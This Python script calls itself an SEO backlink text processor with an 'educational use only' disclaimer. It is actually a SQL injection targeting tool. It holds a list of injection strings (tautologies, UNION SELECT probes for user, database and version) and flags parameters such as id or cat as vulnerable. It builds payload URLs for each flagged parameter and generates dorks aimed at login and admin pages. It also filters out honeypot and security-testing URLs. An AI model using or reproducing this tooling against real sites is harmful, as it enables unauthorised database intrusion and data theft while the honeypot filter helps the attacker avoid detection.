#!/usr/bin/env python3
"""
Advanced Text Processor for SEO Backlink Building
Educational purposes only - Use responsibly
"""

import re
import csv
import json
import argparse
import urllib.parse
from pathlib import Path
from collections import defaultdict, Counter
from typing import List, Dict, Set, Tuple
import logging

class URLProcessor:
    """Advanced URL processing and analysis toolkit"""
    
    def __init__(self, output_dir: str = "processed_data"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.output_dir / 'processing.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Categorization patterns
        self.category_patterns = {
            'education': re.compile(r'(edu|school|college|university|course|class|workshop|tutorial|learn|academic)', re.I),
            'ecommerce': re.compile(r'(shop|store|product|cart|buy|order|price|catalog|payment|checkout)', re.I),
            'content': re.compile(r'(blog|article|news|content|post|page|cms|wordpress|drupal)', re.I),
            'services': re.compile(r'(service|business|company|professional|contact|about|consulting)', re.I),
            'forums': re.compile(r'(forum|community|discussion|board|thread|topic|member)', re.I),
            'social': re.compile(r'(social|profile|user|account|login|register|signup)', re.I),
            'art_creative': re.compile(r'(art|creative|design|gallery|studio|workshop|portfolio|artist)', re.I)
        }
        
        # SQL injection patterns
        self.injection_patterns = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' OR 1=1 LIMIT 1--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' OR 1=1#",
            "' UNION SELECT user(),database(),version()--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' OR EXISTS(SELECT * FROM information_schema.tables)--"
        ]

    def clean_urls(self, urls: List[str]) -> List[str]:
        """Clean and validate URLs"""
        self.logger.info(f"Cleaning {len(urls)} URLs...")
        
        cleaned = []
        for url in urls:
            url = url.strip()
            if not url:
                continue
                
            # Basic URL validation
            if not re.match(r'^https?://', url):
                continue
                
            # Filter out security testing sites
            if re.search(r'(honeypot|security|test|admin|phpmyadmin|sqlmap)', url, re.I):
                continue
                
            # Length check
            if len(url) > 2000:
                continue
                
            cleaned.append(url)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_urls = []
        for url in cleaned:
            if url not in seen:
                seen.add(url)
                unique_urls.append(url)
        
        self.logger.info(f"Cleaned URLs: {len(unique_urls)} valid URLs")
        return unique_urls

    def extract_url_components(self, urls: List[str]) -> List[Dict]:
        """Extract detailed components from URLs"""
        self.logger.info("Extracting URL components...")
        
        components = []
        for url in urls:
            try:
                parsed = urllib.parse.urlparse(url)
                
                # Extract path components
                path_parts = [part for part in parsed.path.split('/') if part]
                
                # Extract parameters
                params = dict(urllib.parse.parse_qsl(parsed.query))
                
                # Extract potential keywords from path
                path_keywords = []
                for part in path_parts:
                    keywords = re.findall(r'[a-zA-Z]{3,}', part)
                    path_keywords.extend(keywords)
                
                component_data = {
                    'url': url,
                    'scheme': parsed.scheme,
                    'domain': parsed.netloc,
                    'path': parsed.path,
                    'path_parts': path_parts,
                    'path_keywords': path_keywords,
                    'parameters': list(params.keys()),
                    'param_values': params,
                    'query_string': parsed.query,
                    'fragment': parsed.fragment,
                    'potential_injection_points': len(params)
                }
                
                components.append(component_data)
                
            except Exception as e:
                self.logger.warning(f"Error processing URL {url}: {e}")
                continue
        
        return components

    def categorize_urls(self, url_components: List[Dict]) -> Dict[str, List[str]]:
        """Categorize URLs based on content patterns"""
        self.logger.info("Categorizing URLs...")
        
        categories = defaultdict(list)
        
        for component in url_components:
            url = component['url']
            full_text = f"{component['domain']} {component['path']} {' '.join(component['path_keywords'])}"
            
            categorized = False
            for category, pattern in self.category_patterns.items():
                if pattern.search(full_text):
                    categories[category].append(url)
                    categorized = True
                    break
            
            if not categorized:
                categories['other'].append(url)
        
        # Log category statistics
        for category, urls in categories.items():
            self.logger.info(f"Category '{category}': {len(urls)} URLs")
        
        return dict(categories)

    def find_vulnerable_parameters(self, url_components: List[Dict]) -> List[Dict]:
        """Identify potentially vulnerable URL parameters"""
        self.logger.info("Analyzing parameters for vulnerabilities...")
        
        vulnerable_indicators = ['id', 'user', 'page', 'cat', 'category', 'product', 'item', 'search', 'query']
        
        vulnerable_urls = []
        for component in url_components:
            if component['parameters']:
                vulnerability_score = 0
                vulnerable_params = []
                
                for param in component['parameters']:
                    param_lower = param.lower()
                    if any(indicator in param_lower for indicator in vulnerable_indicators):
                        vulnerable_params.append(param)
                        vulnerability_score += 1
                
                if vulnerable_params:
                    vulnerable_data = {
                        'url': component['url'],
                        'domain': component['domain'],
                        'vulnerable_parameters': vulnerable_params,
                        'all_parameters': component['parameters'],
                        'vulnerability_score': vulnerability_score,
                        'param_values': component['param_values']
                    }
                    vulnerable_urls.append(vulnerable_data)
        
        # Sort by vulnerability score
        vulnerable_urls.sort(key=lambda x: x['vulnerability_score'], reverse=True)
        
        self.logger.info(f"Found {len(vulnerable_urls)} URLs with potentially vulnerable parameters")
        return vulnerable_urls

    def generate_sql_payloads(self, vulnerable_urls: List[Dict]) -> List[Dict]:
        """Generate SQL injection payloads for testing"""
        self.logger.info("Generating SQL injection payloads...")
        
        payloads = []
        for url_data in vulnerable_urls:
            base_url = url_data['url'].split('?')[0]
            
            for param in url_data['vulnerable_parameters']:
                for pattern in self.injection_patterns:
                    # Create payload URL
                    payload_params = url_data['param_values'].copy()
                    payload_params[param] = pattern
                    
                    query_string = urllib.parse.urlencode(payload_params)
                    payload_url = f"{base_url}?{query_string}"
                    
                    payload_data = {
                        'original_url': url_data['url'],
                        'payload_url': payload_url,
                        'target_parameter': param,
                        'injection_pattern': pattern,
                        'domain': url_data['domain'],
                        'vulnerability_score': url_data['vulnerability_score']
                    }
                    payloads.append(payload_data)
        
        self.logger.info(f"Generated {len(payloads)} SQL injection payloads")
        return payloads

    def analyze_domains(self, url_components: List[Dict]) -> Dict:
        """Analyze domain statistics and patterns"""
        self.logger.info("Analyzing domain patterns...")
        
        domain_stats = defaultdict(list)
        tld_counter = Counter()
        
        for component in url_components:
            domain = component['domain']
            domain_stats[domain].append(component['url'])
            
            # Extract TLD
            if '.' in domain:
                tld = domain.split('.')[-1]
                tld_counter[tld] += 1
        
        analysis = {
            'total_domains': len(domain_stats),
            'domains_with_multiple_urls': len([d for d, urls in domain_stats.items() if len(urls) > 1]),
            'top_domains': sorted(domain_stats.items(), key=lambda x: len(x[1]), reverse=True)[:20],
            'tld_distribution': dict(tld_counter.most_common(10)),
            'avg_urls_per_domain': sum(len(urls) for urls in domain_stats.values()) / len(domain_stats)
        }
        
        return analysis

    def add_prefix_suffix(self, urls: List[str], prefix: str = "", suffix: str = "") -> List[str]:
        """Add prefix and suffix to URLs (TextMechanic.com equivalent)"""
        self.logger.info(f"Adding prefix '{prefix}' and suffix '{suffix}' to URLs...")
        
        processed_urls = []
        for url in urls:
            processed_url = f"{prefix}{url}{suffix}"
            processed_urls.append(processed_url)
        
        return processed_urls

    def extract_columns_4_5(self, url_components: List[Dict]) -> List[Dict]:
        """Extract columns 4 and 5 equivalent data (keywords and parameters)"""
        self.logger.info("Extracting keyword columns...")
        
        column_data = []
        for component in url_components:
            # Column 4: Path keywords (primary keywords)
            col4_keywords = component['path_keywords'][:5]  # Top 5 path keywords
            
            # Column 5: Parameter names (secondary keywords)
            col5_keywords = component['parameters'][:3]  # Top 3 parameters
            
            if col4_keywords or col5_keywords:
                data = {
                    'url': component['url'],
                    'domain': component['domain'],
                    'column_4_keywords': col4_keywords,
                    'column_5_keywords': col5_keywords,
                    'combined_keywords': col4_keywords + col5_keywords
                }
                column_data.append(data)
        
        return column_data

    def randomize_dorks(self, base_dorks: List[str]) -> List[str]:
        """Randomize and mix dorks as mentioned in step 10"""
        self.logger.info("Randomizing dorks...")
        
        import random
        
        # Base dork components
        site_operators = ['site:', 'inurl:', 'intitle:', 'intext:']
        parameters = ['id=', 'cat=', 'user=', 'page=', 'search=', 'q=']
        keywords = ['login', 'admin', 'user', 'customer', 'member', 'account']
        
        randomized_dorks = []
        
        # Mix existing dorks with random components
        for dork in base_dorks:
            # Add random parameters
            random_param = random.choice(parameters)
            random_keyword = random.choice(keywords)
            
            mixed_dork = f"{dork} {random.choice(site_operators)}{random_param} \"{random_keyword}\""
            randomized_dorks.append(mixed_dork)
        
        # Generate additional random combinations
        for _ in range(len(base_dorks)):
            operator = random.choice(site_operators)
            param = random.choice(parameters)
            keyword = random.choice(keywords)
            
            random_dork = f"{operator}{param} \"{keyword}\""
            randomized_dorks.append(random_dork)
        
        # Shuffle the final list
        random.shuffle(randomized_dorks)
        
        return randomized_dorks

    def export_results(self, results: Dict, filename_prefix: str = "processed"):
        """Export results in multiple formats"""
        self.logger.info("Exporting results...")
        
        # Export as JSON
        json_file = self.output_dir / f"{filename_prefix}_results.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        # Export individual components as text files
        for key, data in results.items():
            if isinstance(data, list) and data:
                txt_file = self.output_dir / f"{filename_prefix}_{key}.txt"
                
                with open(txt_file, 'w', encoding='utf-8') as f:
                    if isinstance(data[0], str):
                        # Simple string list
                        f.write('\n'.join(data))
                    elif isinstance(data[0], dict):
                        # Dictionary list - create CSV
                        csv_file = self.output_dir / f"{filename_prefix}_{key}.csv"
                        with open(csv_file, 'w', newline='', encoding='utf-8') as csvf:
                            if data:
                                writer = csv.DictWriter(csvf, fieldnames=data[0].keys())
                                writer.writeheader()
                                writer.writerows(data)
        
        self.logger.info(f"Results exported to {self.output_dir}")

def main():
    parser = argparse.ArgumentParser(
        description="Advanced URL Processor for SEO Backlink Building (Educational Use Only)"
    )
    parser.add_argument('input_file', help='Input file containing URLs')
    parser.add_argument('-o', '--output', default='processed_data', help='Output directory')
    parser.add_argument('--clean', action='store_true', help='Clean and validate URLs')
    parser.add_argument('--categorize', action='store_true', help='Categorize URLs')
    parser.add_argument('--analyze', action='store_true', help='Analyze vulnerable parameters')
    parser.add_argument('--payloads', action='store_true', help='Generate SQL injection payloads')
    parser.add_argument('--keywords', action='store_true', help='Extract keywords (columns 4-5)')
    parser.add_argument('--prefix', default='', help='Add prefix to URLs')
    parser.add_argument('--suffix', default='', help='Add suffix to URLs')
    parser.add_argument('--randomize', action='store_true', help='Randomize dorks')
    
    args = parser.parse_args()
    
    # Initialize processor
    processor = URLProcessor(args.output)
    
    # Read input file
    try:
        with open(args.input_file, 'r', encoding='utf-8') as f:
            raw_urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Input file '{args.input_file}' not found")
        return 1
    
    print(f"Loaded {len(raw_urls)} URLs from {args.input_file}")
    
    results = {}
    
    # Clean URLs
    if args.clean or not any([args.categorize, args.analyze, args.payloads]):
        clean_urls = processor.clean_urls(raw_urls)
        results['cleaned_urls'] = clean_urls
    else:
        clean_urls = raw_urls
    
    # Extract URL components
    url_components = processor.extract_url_components(clean_urls)
    results['url_components'] = url_components
    
    # Process based on arguments
    if args.categorize:
        categories = processor.categorize_urls(url_components)
        results.update(categories)
    
    if args.analyze:
        vulnerable_urls = processor.find_vulnerable_parameters(url_components)
        results['vulnerable_urls'] = vulnerable_urls
        
        domain_analysis = processor.analyze_domains(url_components)
        results['domain_analysis'] = domain_analysis
    
    if args.payloads and 'vulnerable_urls' in results:
        payloads = processor.generate_sql_payloads(results['vulnerable_urls'])
        results['sql_payloads'] = payloads
    
    if args.keywords:
        keyword_data = processor.extract_columns_4_5(url_components)
        results['extracted_keywords'] = keyword_data
    
    if args.prefix or args.suffix:
        prefixed_urls = processor.add_prefix_suffix(clean_urls, args.prefix, args.suffix)
        results['prefixed_urls'] = prefixed_urls
    
    if args.randomize:
        # Create base dorks from URLs
        base_dorks = [f"site:{urllib.parse.urlparse(url).netloc}" for url in clean_urls[:50]]
        randomized_dorks = processor.randomize_dorks(base_dorks)
        results['randomized_dorks'] = randomized_dorks
    
    # Export results
    processor.export_results(results)
    
    print(f"\nProcessing complete! Results saved to: {args.output}")
    print(f"Total result categories: {len(results)}")
    
    return 0

if __name__ == '__main__':
    exit(main())